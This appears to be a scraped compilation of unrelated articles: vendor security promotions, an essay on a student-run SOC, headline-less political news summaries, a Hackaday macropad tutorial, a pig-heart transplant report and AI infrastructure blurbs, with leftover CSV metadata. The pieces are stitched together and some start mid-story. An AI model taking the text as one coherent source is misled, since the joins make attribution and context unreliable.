Pursue data loss prevention (DLP): This is a wide-ranging solution, combining technologies like AI and antivirus software with techniques and actions focused on people and processes, all with the aim of identifying and preventing data-connected harm. 
Classify sensitive data: Protection begins with knowledge. Develop a thorough understanding of your riskiest data to ensure you know where to prioritize your security implementation. 
Audits: Through both external audit checks and a comprehensive internal audit program, organizations can increase their chances of identifying potential vulnerabilities. 
Training: Of course, no technical solution or operational enhancement can succeed without full employee engagement and understanding. Adequate training will ensure your staff and other stakeholders are up to speed, while engagement may even produce new insights into vulnerabilities and mitigation techniques.

CompassDRP: Detect leaked data
As your digital attack surface grows, so does the risk of data leakage. Outpost24’s CompassDRP helps organizations manage this expanding threat environment, with a key module focused on data leakage. 
The feature has crucial applications for many businesses. These include:

Detect potentially leaked documents or confidential data: Users often rely on unauthorized or misconfigured applications to share documents and sometimes confidential data with customers or colleagues. The Data Leakage feature is designed to detect such cases across numerous sources, including document repositories. 
Detect potentially leaked source code: Such leakages could reveal internal information to an attacker, including IP or even the authentication tokens in the code. The Data Leakage feature searches code repositories to detect these leaks. 

Organizations of all sizes deal with growing volumes of data today. This is a huge advantage, helping gather insights into your business and your customer base. However, it also poses risks, as we have seen. 
By embracing technological innovation and operational enhancements, you can help ensure your organization realizes the many benefits of this information without succumbing to the dangers and costly consequences of data leakage. Book a CompassDRP live demo.

At a time when digital security is more important than ever, this growing talent shortage poses an extreme risk to public and private entities. In fact, according to the same data from NIST, it's expected that more than half of significant cybersecurity incidents this year will result from a lack of talent or human failure.So, how do we address this shortage? By shoring up the programs that train the next generation of industry talent.Student-Run SOCs: A Model for Workforce DevelopmentThe current industry talent shortage is where student-run security operations centers (SOCs) can come into play. These unique, new-to-market programs offer academic institutions an opportunity to defray the costs often associated with SOC operations, shoring up their cybersecurity systems while providing students with hands-on experience that translates into marketable skills upon graduation.In Louisiana, a first-of-its-kind student-run SOC is leading the charge across 34 Louisiana State University (LSU) campuses, utilizing a whole-of-state approach to cybersecurity. Launched in 2023, LSU's program recruits students from all disciplines, not just cybersecurity and IT, to work on the SOC with continuous support and training from TekStream through its MDR service, which uses Splunk's SIEM/SOAR software deployed on AWS. The SOC provides 24/7 security coverage across 34 institutions while providing students up to 1,000 hours of frontline security experience each year. Since early 2024, students have worked on approximately 33% of all the SOC's cybersecurity incidents.Related:Czech Warning Highlights China Stealing User DataAs part of this innovative model, students are taught by industry veterans how to manage the LSU SOC using Splunk technology. Students are trained at the same level as TekStream employees on cyberattacks, analysis, network defense, policy and escalation, and real-time response tactics to actual incidents. This means they gain valuable experience in professional roles that are in high demand while completing their studies.This not only serves as an excellent opportunity to take a lower-cost approach to training new talent, but it also provides an opportunity for LSU to train and upskill current IT staff. In the long term, this will help LSU and other private and public entities address existing labor shortages driving up labor costs in both the public and private sectors. The first three graduates of the program, Class of December 2024, have all gone on to pursue careers in cybersecurity as full-time TekStream employees.Related:Japan, South Korea Take Aim at North Korean IT Worker ScamBenefits of a Student-Run SOCIn addition to serving as an excellent resource for training and upskilling industry talent, student-run SOCs provide additional benefits. For one, student-run SOCs also offer an affordable, scalable source of on-site talent for academic institutions looking to grow or bolster their cybersecurity programs, especially if they want to take a whole-of-state approach.Additionally, it provides a unique and competitive educational offering for students looking for a successful cybersecurity career post-graduation. Those who partake in the program receive a transcript upon completion that helps them directly transition to the job market. This is an added boon for students looking to enter the field, as it provides a leg-up during the interview and job-offer negotiation process compared with students from other universities.Lastly, the student-run SOC at LSU acts as a scalable model that can be leveraged by other entities, both private and public, around the globe to improve our overall cybersecurity infrastructure. Other academic institutions, like the New Jersey Institute of Technology (NJIT), are already implementing similar programs across their campuses.Related:Hybrid Clouds Provide a Practical Approach to Post-Quantum MigrationImproved CybersecurityThe benefits of the student-run SOC don't end with an upskilled workforce. Through public-private partnerships like the one between LSU, TekStream, Splunk, and AWS, LSU transitioned from a reactive to a proactive security model. That's because, with this structure, LSU gains access to better automation, increased threat sharing and remediation using a whole-of-state approach and consistency with their architecture. At the same time, their costs are lower than a standalone approach and they're able to leverage AI in their cybersecurity program, helping to tackle the barrier-of-entry AI has created for many new grads.Strengthening Public-Private Collaboration for a Secure FutureAccording to a House Committee on Homeland Security data snapshot, cyberattacks on critical infrastructures increased 30% worldwide in 2023. The number of cyberattacks will only grow with the time we spend online and the data we create.Securing and training the next generation of cybersecurity talent is where the future lies for successfully addressing existing talent gaps. Long-term, student-run SOCs provide an educational, scalable approach to cybersecurity resilience that will help public and private entities future-proof their cybersecurity.The LSU student-run SOC is an excellent example of the importance of partnerships between academia, government, and private sector organizations to drive innovation and long-term workforce development. With more programs like the student-run SOC, we can expand our cybersecurity workforce and better secure our public and private entities for when, not if, cyberattacks occur.Read more about:CISO CornerAbout the AuthorBruce JohnsonSenior Director, Enterprise SecurityBruce Johnson has more than 38 years of experience in the information technology industry, including security, infrastructure architecture, software development, and management of multiple portfolios.

The Details: Bayrou called the vote of confidence on himself while trying to pass a controversial national budget that would include $44 billion (euros) in cuts. The vote was reportedly bipartisan, and 25 Members of Parliament (MPs) abstained. French President Emmanuel Macron is expected to accept Bayrou’s official resignation on Tuesday and appoint a new prime minister in the coming days. On Wednesday, anti-government protests are set to take place throughout France.

For Context: Former Prime Minister Michel Barnier was subject to a no-confidence motion in December, making Monday’s events the second ousting in ten months. Prior to that, the last no-confidence motion was in 1962.

How The Media Covered It: News outlets across the political spectrum were pessimistic towards the future of the French economy and political system. NBC (Lean Left bias) asserted, “Though Macron remains a big presence internationally — leading European efforts to support Ukraine and provide a counterweight to President Donald Trump — at home he is dogged by a divided electorate and long-term uncertainty.” A BBC (Center) editor stated, “[Bayrou’s] defeat was inevitable - but France's enormous pile of debt remains.” Breitbart (Right) said Macron “can either attempt to install another prime minister and continue the fight within the deeply divided National Assembly, or he can dissolve the parliament and call fresh legislative elections.”

The Details: In July, immigration rights groups and labor unions sued the Trump administration, arguing that ICE was arresting people without reasonable suspicion and targeting them based on their race and language. As a result, a federal district judge blocked ICE from conducting raids in Los Angeles. On September 8, the Supreme Court removed the block in a 6-3 decision. Justice Brett Kavanaugh wrote that “apparent ethnicity alone cannot furnish reasonable suspicion” but said that “it can be a ‘relevant factor’ when considered along with other salient factors.”
	Response from the Trump Administration: Attorney General Pam Bondi called the ruling a “massive victory” on X, writing, “Now, ICE can continue carrying out roving patrols in California without judicial micromanagement.”
	Response from Critics: Justice Sonia Sotomayor, joined by the two other liberal judges on the Supreme Court, wrote in her dissent, “We should not have to live in a country where the government can seize anyone who looks Latino, speaks Spanish, and appears to work a low wage job.”
	How the Media Covered It: Bloomberg (Lean Left bias) highlighted the specifics of the ruling, writing in their headline that the court lifted the “Migrant Profiling Ban,” while BBC (Center) and Fox News (Right) focused only on the resuming raids in their headlines. Bloomberg also wrote that the courts have largely supported President Donald Trump’s “far-reaching immigration agenda.” Fox News included positive responses from Kavanaugh and the Department of Homeland Security, though it also included a brief quote from Sotomayor’s dissent.

The Details: The complaint, Jones v. Mahaniah, states, “If a family does not walk in lockstep with DCF’s radical demands, DCF revokes their license… Both families will provide a loving and respectful home for any child, including transgender, gay, or lesbian foster children. But that is insufficient for Massachusetts.” It calls the department’s constitutionality into question due to the requirements “forcing these families to speak against their core religious beliefs.”

DCF Policies: The Massachusetts DCF requires the use of “supportive, gender-neutral language” and directs, “Transgender youth have the right to be identified by the name and pronouns that accord with their gender identity and to wear clothing consistent with their gender identity.” Policies further assert, “A youth has the right to be free from religious indoctrination that condemns or puts down a youth’s sexual orientation or gender identity or expression.”

Other Cases: Similarly, another Massachusetts family sued DCF in 2023, alleging the department denied them foster care approval due to their Catholic beliefs. Alternatively, an Oregon court ruled in favor of foster mother Jessica Bates in July, not requiring her to comply with state gender affirmation laws due to her religious beliefs. 

How The Media Covered It: The story was mainly covered by media outlets on the right but did not receive widespread national coverage. Fox News (Right bias) noted that one of the families “cared for 28 foster children over six years.” An opinion writer for the Boston Globe (Left) wrote, “In a state that struggles to care for foster children, it’s foolish to turn away proven parents who have objections to a policy that only hypothetically applies to them.”

The Details: Zarutska was murdered by Decarlos Brown Jr., 35, who had at least 14 prior arrests. Video footage released by the Charlotte Area Transit System (CATS) on September 6 showed Zarutska enter the railcar and sit in a chair in front of Brown. Unprovoked, Brown pulled out what appeared to be a knife and stabbed Zaruska several times. CATS said Brown did not display any alarming behavior leading up to the stabbing, and police arrested him on the train platform after he exited the car. According to Zaruska’s Instagram, she appears to have been living in the United States for several years.

Initial Coverage: In the days after the stabbing, AllSides saw the stabbing discussed on X and found mainstream coverage from The New York Post (Lean Right bias), Daily Mail (Right), Fox News (Right), The Independent (Lean Left), The Mirror (Left), and Metro (Lean Left).

Current Coverage: Since the footage was released, the story has been covered more widely by the mainstream and discussed even more on X. Some outlets and commentators criticized other media for not covering the story. Mary Harrington of UnHerd (Center) published the opinion, “Why is the media silent about Iryna Zarutska’s murder?” The New York Post wrote in a headline that the news was “met with deafening silence from Dem leaders, media.” Piers Morgan (Lean Right) wrote on X, “Why is the disgusting, senseless, unprovoked murder… not getting more media attention?!” CNN (Lean Left) wrote in its headline that the video release is “stirring debate on crime in major US cities.” Axios opened its coverage by describing the stabbing as part of a wave of urban crime “MAGA influencers are drawing repeated attention to.”

The Details: On Monday morning, Trump said, “In the last 11 days we’ve had no murders and that’s the first time that’s taken place in years actually, years.” A man was shot dead shortly after midnight on Tuesday, ending the homicide-free streak.

Fox News: Fox News (Right bias) said that Trump's crackdown benefited black Americans, who are the most common victims of homicide in the area. It cited the Crime Prevention Research Center, which concluded, based on the last seven months of crime statistics, the probability of a homicide-free streak without Trump's crackdown was 0.37%. The research noted that looking at February and March artificially lowers the data because homicides tend to peak in the summer months, making this streak more significant.

Washington Post: The Post (Lean Left) took a different angle from Fox News, noting that Trump's claim about the homicide-free streak being the longest in years is incorrect. ""D.C. went 16 days without a homicide earlier this year, from Feb. 24 to March 13. But even 10 days without a killing is rare in the city, occurring once this year before Trump’s takeover of D.C. police and once in January of last year. The 16-day streak earlier this year was the longest in at least six years."" The Post added that ""Crime data shows that before Trump ordered a surge in federal law enforcement, the District had already reached a 30-year-low in violent crime,"" showing skepticism toward crediting Trump for the downturn in crime.

The Details: The note was in a 238-page book given to Epstein, the late convicted pedophile financier, in 2003. The book was put together by ex-girlfriend and co-conspirator Ghislaine Maxwell for Epstein's 50th birthday, and released by the House Oversight Committee along with a trove of documents that include Epstein's personal address book and his will. The White House denies that the note, which included an outline sketch of a woman's body, was authored or signed by Trump. Meanwhile, the Democrats on the House Oversight Committee released a second page from the birthday book that shows Epstein and a longtime Mar-a-Lago member joking about selling a ""fully depreciated"" woman to Trump for $22,500. The book also contains a letter from former President Bill Clinton which appears to praise Epstein's “childlike curiosity,"" and the ""drive to make a difference.""

Key Quote: White House Press Secretary Karoline Leavitt posted on X, ""The latest piece published by the Wall Street Journal PROVES this entire 'Birthday Card' story is false. As I have said all along, it's very clear President Trump did not draw this picture, and he did not sign it. President Trump's legal team will continue to aggressively pursue litigation. This is FAKE NEWS to perpetuate the Democrat Epstein Hoax!""

For Context: The House Oversight Committee has been probing into the Department of Justice's (DOJ) handling of the Epstein case, and the drawing was in the files obtained from his estate. The release of the Epstein files comes as Trump faces pressure for more transparency, even from some Republicans, on what was learned from those files. Epstein committed suicide in this jail cell on August 10, 2019, while awaiting trial on sex trafficking charges.

How the Media Covered It: The New York Times (Lean Left bias) reported that Democrats are seizing on the drawing to renew their demand for the Trump administration to divulge all the Epstein files. It also noted that while the White House has shared photos showing Trump's signature to be more angular than the one in the note, the Times has also reviewed several pieces of correspondence from Trump decades ago with just his first name that look similar to the signature on the drawing. The Washington Times (Lean Right) noted that Trump's past socializing with Epstein does not show any evidence of wrongdoing on Trump's part.

The Details: FT cited “three European officials familiar with the matter” as its sources. The State Department informed several European countries last week that it would be terminating memoranda of understanding signed in 2024 under the Biden administration. The memoranda were part of an initiative led by the State Department’s Global Engagement Center (GEC) and signed by 22 European and African nations.

For Context: The move is the latest in a series of Trump administration reforms aimed at scaling back government-sanctioned media influence abroad. Previously, the State Department had allotted large sums of money for influencing elections and discourse globally, such as $41 million to Georgia or $22 million to Moldova. In early August, Reuters (Center) reported that Secretary of State Marco Rubio instructed American diplomats in Europe to lobby against the EU’s Digital Services Act, which aims to “prevent illegal and harmful activities online and the spread of disinformation.”

How The Media Covered It: The story was not widely covered across the spectrum. AllSides only found coverage from The Kyiv Independent (Center) and Kremlin-funded RT (Lean Right), both of which attributed the reporting to FT. Two days before the report was published, The New York Times (Lean Left) published an analysis of the information landscape in Moldova ahead of its September 28 elections titled, “Russia Steps Up Disinformation Efforts as Trump Abandons Resistance.”

Key Quote: Trump said, “There's no crime. They said, ‘Crime's down 87%.’ I said, ‘No, no, no, it's more than 87%.’ Virtually nothing… and much lesser things. Things that take place in the home, they call crime. You know, they'll do anything they can to find something. If a man has a little fight with the wife, they say, ‘This was a crime, see?’ So now I can't claim 100%.”

For Context: Crime in DC has fallen since President Trump deployed the National Guard and federalized local law enforcement on August 11. Data from the Metropolitan Police Department has shown that property crimes have fallen significantly more than violent crimes.

How The Media Covered It: The story was widely covered by outlets on the left. AllSides did not find coverage from the right. Most outlets that covered the story characterized Trump’s description of “a little fight with the wife” as “domestic violence” and noted his description of it as a “lesser” crime in headlines. NBC News (Lean Left bias) ran the headline, “Trump appears to dismiss domestic violence as a ‘lesser’ crime.” The Washington Post (Lean Left) wrote the headline, “Trump downplays domestic disturbances as he touts D.C. crime reduction.”

The Details: Speaking at the Museum of the Bible, Trump said the initiative encourages Americans to dedicate one hour each week to praying for the country. He also said the Department of Education will soon “issue new guidance protecting the right to prayer in our public schools.” Trump also donated his family’s Bible to the museum.

For Context: In May, Trump established the Religious Liberty Commission through executive order. Its purpose is to “advise the White House Faith Office and the Domestic Policy Council on religious liberty policies of the United States.” The commission is in response to what the White House said was “Federal, State, and local policies [that] have threatened America’s unique and beautiful tradition of religious liberty,” and attempts to “remove religion entirely from public life.”

How the Media Covered It: Washington Times (Lean Right bias) framed the initiative as part of Trump’s broader efforts to protect Americans’ religious freedom. Daily Beast (Left) highlighted criticism that the initiative removes religious diversity in favor of “one set of Christian beliefs.” Newsweek (Center) outlined the legal balance between “religious expression and the constitutional prohibition on government‑sponsored prayer.” It highlighted other attempts by Texas and Oklahoma to bring back religious practices in schools.

Hawaii announced it was also joining the Alliance.

The Details: According to a joint press release, the Alliance is a shared “commitment to ensuring that public health recommendations are guided by safety, efficacy, transparency, access, and trust.” It will use guidelines informed by “trusted scientists, clinicians, and other public health leaders” to determine healthcare recommendations within the states. Some of the medical organizations specified include the American Academy of Pediatrics, and the American College of Obstetricians and Gynecologists.

Key Quotes: The three states’ governors said, “President Trump’s mass firing of CDC doctors and scientists — and his blatant politicization of the agency — is a direct assault on the health and safety of the American people. The CDC has become a political tool that increasingly peddles ideology instead of science...California, Oregon, and Washington will not allow the people of our states to be put at risk.”

For Context: The decision comes amid several changes to the CDC by the Trump administration and Health and Human Services (HHS) Secretary Robert F. Kennedy Jr. In June, Kennedy removed all members of the CDC Advisory Committee on Immunization Practices (ACIP). On August 28, Susan Monarez, the Director of the CDC, was fired weeks after being sworn in. Senator Bernie Sanders (I-VT) and some Democratic politicians have asked Kennedy to resign.

How the Media Covered It: CNN (Lean Left bias) highlighted other state-led initiatives to “divorce their policies from the CDC,” including its updated vaccine recommendations. Straight Arrow News (Center) contrasted the move with Florida’s decision to end childhood vaccine requirements. Fox News (Right) quoted HHS spokesperson Andrew Nixon who said Democrat COVID-19 policies “completely eroded the American people’s trust in public health agencies.” It shared arguments from the joint press release, and framed the Alliance as a “rejection” of Trump.

I was met with less than full enthusiasm from half my family, though my son was totally on board.I love shrimp. And I went on a tirade about how there was a little mom and pop restaurant in Destin, Fla., that made my favorite shrimp scampi dish of all time.I proclaimed I'd make the trip down to the panhandle just to eat that dish again.

Companies keep emerging to test the technology.Not only do attack surfaces continue to expand, but organizations are now armed with a plethora of fragmented IT and security tools. Those tools can generate an unmanageable number of alerts for security teams, making threat prioritization difficult.Tonic Security emerged from stealth this week with $7 million in seed funding for its agentic exposure management platform, aiming to help organizations improve vulnerability management. The startup seeks to answer critical mitigation questions, including which vulnerabilities are truly exploitable, how feasible remediation is, and which business processes are affected. The platform works by combining threat intelligence with data specific to the organization, like help-desk tickets, documents, and emails.Lessons Learned from the Incident Response FrontlinesInspired by their experiences on the frontlines of incident response, CEO Sharon Isaaci and CPO David Warshavski launched Tonic Security in 2024. After observing how enterprise security teams respond to destructive incidents versus the quieter times, they discovered a key problem.Related:AirMDR Tackles Security Burdens for SMBs With AI""[Most security breaches] are often the direct result of a known exposure that was misprioritized by the victim organization's security team and then exploited by the threat actors before being fixed by the defenders,"" Isaaci tells Dark Reading.  The fix? Promoting faster remediation times. That means increasing organizations' visibility, context around the risk's threats, and focus. The company's main goal is to remediate business-critical exposures before they are breached.How Can AI Help?AI helps achieve that by integrating data across security, IT, and collaboration tools. Tonic Security's platform features three layers: data, intelligence, and action. The AI data piece works to aggregate and correlate vast volumes of data while extracting important context. The context is crucial for security practitioners, as well as for AI agents, explains Isaaci.It's difficult to know which flaws and issue pose the highest risk to a specific organization. The intelligence layer helps organizations determine exploitability potential, which helps with prioritization and security alert management.""Tonic decided to focus on AI-powered exposure management and vulnerability remediation, rather than other use cases, such as threat detection and incident response or AI assistant for triage and forensic investigation, because there's a greater pain and need and tech debt in vulnerability management in the face of growing volume,"" Isaaci says. ""[Also] there's greater value in preventing incidents rather than responding to them when they happen.""Related:Democratizing Security to Improve Security PostureAbout the AuthorArielle WaldmanFeatures Writer , Dark Reading Arielle Waldman is a Boston-based features writer for Dark Reading covering all things cybersecurity.See more from Arielle WaldmanKeep up with the latest cybersecurity threats, newly discovered vulnerabilities, data breach information, and emerging trends.

As organizations deploy AI systems, data becomes executable intelligence rather than passive information. Relyance AI’s Data Defense Engineer is intended to shift from static data scanning to real-time data journey mapping, providing enterprises with superintelligence that continuously tracks how sensitive data flows through code, cloud infrastructure, and AI systems—all available through a conversational query for security teams to ask questions in plain English and get immediate answers.
“We’re witnessing a tectonic shift where data isn’t just stored information anymore—it’s executable intelligence that directly influences what software does,” said Abhi Sharma, CEO and co-founder of Relyance AI. “When data becomes the context that shapes AI behavior, a breach isn’t just about stolen records; it’s about corrupted intelligence that can manipulate every decision your systems make. Traditional security tools were built for a world where data stayed put. With Data Defense Engineer, we’ve rebuilt data security from first principles for the age of superintelligence.”
Recent high-profile breaches have targeted sensitive data that flows through an organization’s tech stack including UnitedHealthcare’s $3.09 billion total cost from a single ransomware attack and National Public Data’s 2.9 billion records exposed, leading to company bankruptcy. These breaches clearly underscore the high cost of critical gaps in current approaches:
	
	
	  
		googletag.cmd.push(function() { googletag.display('div-gpt-ad-1689000947108-0'); });
	  
	

“The scale of unknown data exposure is staggering,” noted Chris Bender, CISO at ClickUp, an early Relyance AI customer. “AI is creating and moving data faster than any team can track. Only AI-native tools like Relyance AI can keep up with the discovery and enforcement loop.”
CISOs and CIOs today face an impossible choice: enable rapid AI innovation or maintain security and compliance. Traditional tools force this trade-off because they can’t keep up with the speed and complexity of modern data flows.
Relyance AI’s Data Defense Engineer eliminates that trade-off by allowing customers to deploy AI confidently with complete visibility and control over how their data is used which also accelerates innovation by providing guardrails that work at the speed of code.
Relyance AI’s Data Defense Engineer significantly enhances the Data Security Posture Management (DSPM) category by addressing and transforming critical areas such as:


Security and explainability as core design principles


Real-Time Data Flow Visibility: Complete end-to-end mapping of how sensitive data moves across code, cloud, SaaS, and AI models
	
	
	  
		googletag.cmd.push(function() { googletag.display('div-gpt-ad-1689001031039-0'); });
	  
	



Natural Language Intelligence: Security teams can ask questions and receive immediate answers such as “show me all customer data flowing to third-party AI services” or “which datasets are training our recommendation model?”


Unified Governance: Consolidates security, privacy, and AI compliance requirements into one platform, breaking down silos across teams




Innovation requires autonomous protection




Autonomous Policy Enforcement: Preventive controls automatically block sensitive or non-compliant data use before violations occur


Context-Aware Automation: Learns how data is actually used, predicts risks, and enforces policies without slowing innovation




Data integrity defines intelligence integrity
	
	
	  
		googletag.cmd.push(function() { googletag.display('div-gpt-ad-1689001182741-0'); });
	  
	



Real-Time Monitoring: Tracks not only data movement but also transformations—every API call, model inference, and processing step


Continuous Integrity Assurance: Protects against data poisoning attacks by ensuring corrupted datasets cannot undermine system intelligence


Unified Governance: Maintains integrity by applying consistent controls across security, compliance, and privacy dimensions




Relyance AI’s flagship platform, Data Journeys, is already deployed by major enterprises including Coinbase, Notion, Canva, ClickUp, Bolt, and Yelp.
“With Relyance AI, we established enhanced visibility of data processing activities, seeing an impressive increase of 1,660% within three weeks of deployment,” said Deborah Usry, Product Counsel at NextRoll.
“Within 15 minutes of connecting to Relyance AI, we had total visibility of our vendors and services. That speed and simplicity changed everything,” added Heather Allen, Privacy Officer at CHG Healthcare.

So, of course, we need an example. Since I’ve been on something of a macropad kick lately, I decided to write a toolkit for building your own macropad using App Inventor and any sort of Linux tools you like.
I mentioned there is a server. I wrote some very basic code to exchange data with the Android device on the Linux side. The protocol is simple:

All messages to the ordinary Linux start with >
All messages to the Android device start with <
All messages end with a carriage return

Security
You can build the server so that it can execute arbitrary commands. Since some people will doubtlessly be upset about that, the server can also have a restrictive set of numbered commands. You can also allow those commands to take arguments or disallow them, but you have to rebuild the server with your options set.
There is a handshake at the start of communications where Android sends “>.” and the server responds “<.” to allow synchronization and any resetting to occur. Sending “>#x” runs a numbered command (where x is an integer) which could have arguments like “>#20~/todo.txt” for example, or, with no arguments, “>#20” if you just want to run the command.
If the server allows it, you can also just send an entire command line using “>>” as in: “>>vi ~/todo.txt” to start a vi session.

Backtalk
There are times when you want the server to send you some data, like audio mute status or the current CPU temperature. You can do that using only numbered commands, but you use “>?” instead of “>#” to send the data. The server will reply with “<!” followed by the first line of text that the command outputs.
To define the numbered commands, you create a commands.txt file that has a simple format. You can also set a maximum number, and anything over that just makes a call to the server that you can intercept and handle with your own custom C code. So, using the lower-numbered commands, you can do everything you want with bash, Python, or a separate C program, even. Using the higher numbers, you can add more efficient commands directly into the server, which, if you don’t mind writing in C, is more efficient than calling external programs.
If you don’t want to write programs, things like xdotool, wmctrl, and dbus-send (or qdbus) can do much of what you want a macropad to do. You can either plug them into the commands file or launch shell scripts. You’ll see more about that in the example code.
Now all that’s left is to create the App Inventor interface.
A Not So Simple Sample
One of the pages in the designer
App Inventor is made to create simple apps. This one turned out not to be so simple for a few reasons. The idea was that the macro pad should have a configuration dialog and any number of screens where you could put buttons, sliders, or anything else to interact with the server.
The first issue was definitely a quirk of using App Inventor. It allows you to have multiple screens, and your program can move from screen to screen. The problem is, when you change screens, everything changes. So if we used multiple screens, you’d have to have copies of the Bluetooth client, timers, and anything else that was “global,” like toolbar buttons and their code.
That didn’t seem like a good idea. Instead, I built a simple system with a single screen featuring a toolbar and an area for table layouts. Initially, all but one of the layouts are hidden. As you navigate through the screens, the layout that is active hides, and the new one appears.
Sounds good, but in practice there is a horrible problem. When the layouts become visible, they don’t always recalculate their sizes properly, and there’s no clean way to force a repeat of the layout. This led to quirks when moving between pages. For example, some buttons would have text that is off-center even though it looked fine in the editor.
Another problem is editing a specific page. There is a button in the designer to show hidden things. But when you have lots of hidden things, that’s not very useful. In practice, I just hide the default layout, unhide the one I want to work on, and then try to remember to put things back before I finish. If you forget, the code defensively hides everything but the active page on startup.
Just Browsing
I also included some web browser pages (so you can check Hackaday or listen to Soma FM while you work). When the browser became visible, it would decide to be 1 pixel wide and 1 pixel high, which was not very useful. It took a lot of playing with making things visible and invisible and then visible again to get that working. In some cases, a timer will change something like the font size just barely, then change it back to trigger a recalculation after everything is visible.
Speaking of the browser, I didn’t want to have to use multiple pages with web browser components on it, so the system allows you to specify the same “page” more than once in the list. The page can have more than one title, based on its position, and you can initialize it differently, also based on its position. That was fairly easy, compared to getting them to draw correctly.
Other Gotchas
You’d think 500 blocks was the biggest App Inventor program anyone would be dumb enough to write…
A few other problems cropped up, some of which aren’t the Inventor’s fault. For example, all phones are different, so your program gets resized differently, which makes it hard to work. I just told the interface I was building for a monitor and let the phone resize it. There’s no way to set a custom screen size that I could find.
The layout control is pretty crude, which makes sense. This is supposed to be a simple tool. There are no spacers or padding, for example, but small, fixed-size labels will do the job. There’s also no sane way to make an element span multiple cells in a layout, which leads to lots of deeply nested layouts.
The Bluetooth timeout in App Inventor seemed to act strangely, too. Sometimes it would time out even with ridiculously long timeout periods. I left it variable in the code, but if you change it to anything other than zero, good luck.
How’d It Work?
Over 900 blocks is really dumb!
This is probably the most complex thing you’d want to do with App Inventor. The block structure is huge, although, to be fair, a lot of it is just sending a command off when you press a button. The example pad has nearly 500 blocks. The personalized version I use on my own phone (see the video below) has just over 900 blocks!
Of course, the tool isn’t made for such a scale, so be prepared for some development hiccups. The debugging won’t work after a certain point. You just have to build an APK, load it, and hope for luck.
You can find the demo on GitHub. My version is customized to link to my computer, on my exact screen size, and uses lots of local scripts, so I didn’t include it, but you can see it working in the video below.
If you want to go back and look more at the server mechanics, that was in the last post. Of, if you’d rather repurpose an old phone for a server, we’ve seen that done, too.",https://hackaday.com/2025/09/09/the-android-linux-commander/,Al Williams,2025-09-09 00:00:00,"The article discusses creating a macropad toolkit using App Inventor and Linux tools, detailing the server-client communication for exchanging data between an Android device and the Linux side.

Per The Associated Press, this past Friday, surgeons successfully transplanted a pig heart into a patient as part of an experimental procedure.

In doing so, they showed a genetically modified animal organ could survive and function within the human body without immediate rejection. Three days after the procedure, David Bennett, the individual who underwent the surgery, is alive and “doing well,” according to the hospital.

The Food and Drug Administration authorized the procedure on compassionate grounds. Bennett was ineligible for a traditional heart transplant and had run out of other options. “It was either die or do this transplant. I want to live. I know it’s a shot in the dark, but it’s my last choice,” he said in a statement before doctors operated on him.

Scientists have tried to save humans with animal organs for decades. One of the most notable attempts occurred in 1984 when doctors grafted a baboon heart into Stephanie Fae Beauclair, an infant born with hypoplastic left heart syndrome. The congenital disorder left her body incapable of circulating blood properly. Baby Fae, as she was better known, survived for 21 days before her body eventually rejected the transplanted organ.

According to The New York Times, what makes this latest procedure different is doctors used a heart that had been genetically modified to remove four genes that encode a molecule that causes the body to reject the orphan organ. They also inserted six human genes to make the immune system more tolerable of the foreign tissue. Whether the experiment represents a breakthrough will depend on what happens next. Bennett’s body could still reject the pig heart. For the moment, however, he’s alive, and doctors are understandably excited about what this could mean for patients.

“If this works, there will be an endless supply of these organs for patients who are suffering,” Dr. Muhammad Mohiuddin, scientific director of the University of Maryland School of Medicine’s xenotransplantation program, told The Associated Press. That would be a dramatic change from the status quo. According to the Health Resources and Services Administration, more than 100,000 people are on the national transplant waiting list, and 17 individuals die every day waiting for an organ transplant.",https://www.engadget.com/science/pig-heart-transplant-successful-224645097.html,Unknown,2022-01-10 22:46:45,"Surgeons at the University of Maryland School of Medicine achieved a medical first by successfully transplanting a genetically modified pig heart into a 57-year-old patient, David Bennett, who was ineligible for traditional heart transplants.

This groundbreaking operation follows historical attempts at xenotransplantation and may improve the future of organ transplants, offering hope to many patients waiting for donors.

The company, which operates as Together AI, stated that its service allows customers to access GPU clusters, ranging from a single node with eight GPUs to large, multi-node systems with hundreds of processors, using a single application programming interface. It supports the latest Nvidia Corp. hardware, including Hopper and Blackwell GPUs, and is optimized for use cases such as distributed training and elastic inference.
The service has been in beta test since early summer and the GA release includes several updates based on user feedback, said Charles Zedlewski, chief product officer at Together AI. Among them are improved autoscaling features, the ability to extend reserved infrastructure dynamically and support for infrastructure-as-code tools Skypilot and Terraform.
“We added Terraform support so that people could build their own automations around these GPU clusters,” Zedlewski said. “We also added the ability to recreate clusters and remount them with the original data and storage.”
This remounting capability supports episodic training workloads, in which users pause and resume training jobs over extended periods in which are common in large-scale model development.
GPU cloud
Instant Clusters are essentially designed to emulate the user experience of conventional cloud infrastructure while handling the specific demands of AI workloads. Clusters come preloaded with drivers, schedulers and networking components, including GPU Operator, Nvidia Network Operator and InfiniBand interconnects. Configuring those components manually can take days, the company said.
Zedlewski said because GPU infrastructure differs fundamentally from traditional CPU environments, setup and configuration has remained primarily a manual process. “The whole stack of virtualization and automation around GPU infrastructure is meaningfully different than the equivalent stack that we’ve known for a long time with x86 CPU infrastructure,” he said. Cloud computing providers have spent 20 years fine-tuning CPU infrastructure but are still learning the ins and outs of how to optimize for AI.
Together AI said it performs hardware checks, stress tests and inter-node communication validations before making clusters available. “If you provisioned an eight-node, 64-GPU cluster, we basically pretest every node before it shows up in your environment,” Zedlewski said.
Instant Clusters are optimized for use with Kubernetes, Slurm and other orchestration tools. Customers can lock in specific driver and Nvidia Cuda versions and reuse custom container images to simplify reproducibility across training and inference phases.
Storage can be mounted to clusters on demand. Though users must use Together AI’s POSIX-compliant parallel file systems, storage and compute can be scaled independently.
The service supports variable pricing models based on usage duration, with hourly, daily and multimonth commitments available. A low-end Nvidia HGX H100 inference cluster ranges from $1.76 to $2.39 per hour based on the customer’s frequency commitment. Nvidia’s high-end HGX B200 costs $4 per hour with a long-term commitment and $5.50 per hour for on-demand usage.
Zedlewski said most organizations would struggle to match the infrastructure’s cost-efficiency by building in-house: “I’d be very surprised if anyone attempts to roll their own,” he said.

K2 Think embodies a new approach to building smarter, more efficient AI. With just 32 billion parameters, it outperforms flagship reasoning models that are 20X larger. This breakthrough in parameter efficiency makes K2 Think a powerful alternative for advanced reasoning, redefining what is possible with compact architectures.
Built on six pillars of innovation, K2 Think represents a new class of reasoning model. It employs long chain-of-thought supervised fine-tuning to strengthen logical depth, followed by reinforcement learning with verifiable rewards to sharpen accuracy on hard problems. Agentic planning allows the model to decompose complex challenges before reasoning through them, while test-time scaling techniques further boost adaptability.
